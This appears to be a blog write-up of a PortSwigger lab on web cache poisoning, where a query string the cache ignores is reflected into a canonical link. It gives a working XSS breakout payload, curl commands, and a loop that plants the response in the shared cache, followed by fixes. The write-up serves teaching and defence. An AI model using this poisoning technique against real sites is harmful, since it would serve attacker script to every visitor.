---
layout: post
title: "PortSwigger: Web cache poisoning via an unkeyed query string"
date: 2027-11-19 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, WebCachePoisoning]
tags: [portswigger, web-cache-poisoning, cache-key, unkeyed-input, xss, canonical-link, cwe-444]
---

A cache in front of an app makes popular pages fast by remembering responses and replaying them. To decide whether two requests are "the same page," it builds a **cache key** from parts of the request. This lab's cache builds that key from the host and path only — it deliberately ignores the query string. On its own that's fine. The problem is that the app *reflects* the query string into the page, so an attacker can store a response full of malicious markup under the key that ordinary visitors share. That is web cache poisoning ([CWE-444](https://cwe.mitre.org/data/definitions/444.html)).

## Overview

The home page contains a canonical link that echoes the current URL, query string included, inside a single-quoted attribute:

```html
<link rel="canonical" href='//LAB/?evil=...'/>
```

Two facts combine into the bug:

1. The query string is **reflected** into the response, unencoded.
2. The query string is **not part of the cache key** — only host + path are.

So the cache treats `GET /?evil=<anything>` as the very same page as the plain `GET /` that normal users load. If I can make the cache store a response containing my payload, everyone who visits `/` is served that payload for the lifetime of the cache entry.

## Confirming the flaw

The `Origin` header *is* keyed on this lab, which is handy — it doubles as a private cache-buster. I send a unique `Origin` on every probe, so I test freely against my own private cache entry without ever disturbing the shared one.

First, confirm the query string is unkeyed and my breakout reflects:

```
curl -sk -G "https://LAB/" \
  --data-urlencode "evil='/><script>alert(1)</script>" \
  -H "Origin: https://probe.example.com" -D -
```

The canonical link comes back as:

```html
<link rel="canonical" href='//LAB/?evil='/><script>alert(1)</script>
```

The `'` closes the `href`, the `/>` closes the `<link>`, and the bare `<script>` becomes a real element in `<head>` — which runs when the page loads.

## Poisoning the shared cache

Now I drop the `Origin` header so the request lands on the default cache key everyone shares, and loop until I catch a cache **miss** — that miss is the request whose response gets stored:

```bash
until curl -sk -G "https://LAB/" \
  --data-urlencode "evil='/><script>alert(1)</script>" \
  -D - -o /dev/null | grep -qi 'x-cache: miss'; do sleep 1; done
```

Then I verify with a completely plain request — no query string, no special headers, exactly what a victim sends:

```bash
curl -sk "https://LAB/" | grep -o "<script>alert(1)</script>"
```

The payload is there. The lab bot periodically loads the home page, hits the poisoned entry, and `alert(1)` fires — the status widget flips to **Solved**. (The widget lags a few seconds here, because it flips only when the bot next browses, not when I send my final request.)

## Why it worked

The exploit hinges on a mismatch. The cache decides "same page" without looking at the query string, but the app builds the page *using* the query string. An attacker-flavoured request and an innocent request therefore collapse into one cache slot. Fill that slot once with a malicious response and the cache faithfully hands it to every later visitor — turning a per-request reflected XSS (which normally only affects the attacker themselves) into a stored-XSS-like attack against the whole user base.

## The fix

- **Key the cache on the full query string**, or strip and normalise unkeyed parameters before a response is stored. If an input can change the response, it must be part of the key.
- **Encode the reflection.** Context-aware output-encode any URL/query data placed in the canonical `href` (and other absolute URLs) so a value can never break out of the attribute.
- **Don't cache request-shaped HTML.** Pages that embed request-derived URLs should be served `Cache-Control: no-store`, or use a `Vary` rule covering every response-influencing input.
